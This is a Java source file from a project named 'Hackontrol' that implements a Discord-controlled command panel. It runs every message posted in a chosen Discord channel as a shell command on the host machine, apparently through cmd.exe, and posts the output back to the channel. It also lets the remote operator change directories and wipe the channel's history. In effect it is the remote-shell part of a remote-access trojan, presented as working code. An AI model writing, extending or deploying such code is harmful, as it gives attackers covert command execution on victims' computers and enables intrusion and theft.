package com.khopan.hackontrol.panel;

import java.io.File;
import java.util.ArrayList;
import java.util.List;

import com.khopan.hackontrol.library.Kernel;
import com.khopan.hackontrol.registry.Registration;
import com.khopan.hackontrol.utils.HackontrolError;
import com.khopan.hackontrol.utils.sendable.sender.MessageChannelSendable;

import net.dv8tion.jda.api.entities.MessageHistory;

public class CommandPanel extends Panel {
	private static final String PANEL_NAME = "command";

	private static File CurrentDirectory;
	private static int ThreadCount;

	static {
		try {
			CommandPanel.CurrentDirectory = File.listRoots()[0];
		} catch(Throwable Errors) {
			CommandPanel.CurrentDirectory = null;
		}
	}

	@Override
	public String panelName() {
		return CommandPanel.PANEL_NAME;
	}

	@Override
	public void registeration() {
		this.register(Registration.MESSAGE_RECEIVED_EVENT, Event -> {
			if(Event.getAuthor().isBot() || Event.getChannel().getIdLong() != this.channel.getIdLong()) {
				return;
			}

			String command = Event.getMessage().getContentDisplay().trim();
			int length = command.length();

			if(command.startsWith("cls ") || command.startsWith("clear ") || (command.startsWith("cls") && length == 3) || (command.startsWith("clear") && length == 5)) {
				MessageHistory.getHistoryFromBeginning(this.channel).queue(history -> history.getRetrievedHistory().forEach(message -> message.delete().queue()));
				return;
			}

			if(command.startsWith("cd ") || (command.startsWith("cd") && length == 2)) {
				if(command.length() == 2) {
					String directory = CommandPanel.CurrentDirectory == null ? "SYSTEMROOT" : CommandPanel.CurrentDirectory.getAbsolutePath();
					this.channel.sendMessage('`' + directory + '`').queue();
					return;
				}

				command = command.substring(3).trim();

				if(command.isEmpty()) {
					this.channel.sendMessage("`Command input is empty`").queue();
					return;
				}

				File file = new File(command);

				if(!file.exists()) {
					this.channel.sendMessage("`The system cannot find the path specified.`").queue();
					return;
				}

				if(!file.isDirectory()) {
					this.channel.sendMessage("`The directory name is invalid.`").queue();
					return;
				}

				CommandPanel.CurrentDirectory = file;
				this.channel.sendMessage('`' + file.getAbsolutePath() + '`').queue();
				return;
			}

			String finalCommand = command;
			Thread thread = new Thread(() -> {
				this.process(finalCommand);
				CommandPanel.ThreadCount--;
			});

			thread.setName("Hackontrol Command Processor Thread #" + (++CommandPanel.ThreadCount));
			thread.setPriority(4);
			thread.start();
		});
	}

	private void process(String command) {
		try {
			/*ProcessBuilder builder = new ProcessBuilder("cmd.exe", "/c", command);
			builder.redirectErrorStream(true);
			builder.directory(CommandPanel.CurrentDirectory);
			InputStream stream = builder.start().getInputStream();
			byte[] data = stream.readAllBytes();
			stream.close();

			for(String part : this.getParts(new String(data, StandardCharsets.UTF_8), 1992)) {
				this.channel.sendMessage("```\n" + part + "\n```").queue();
			}*/

			Kernel.shellExecute(command, response -> {
				this.channel.sendMessage('`' + response + '`').queue();
			});
		} catch(Throwable Errors) {
			HackontrolError.throwable(MessageChannelSendable.of(this.channel), Errors);
		}
	}

	private List<String> getParts(String text, int partitionSize) {
		List<String> parts = new ArrayList<String>();
		int length = text.length();

		for(int i = 0; i < length; i += partitionSize) {
			parts.add(text.substring(i, Math.min(length, i + partitionSize)));
		}

		return parts;
	}
}
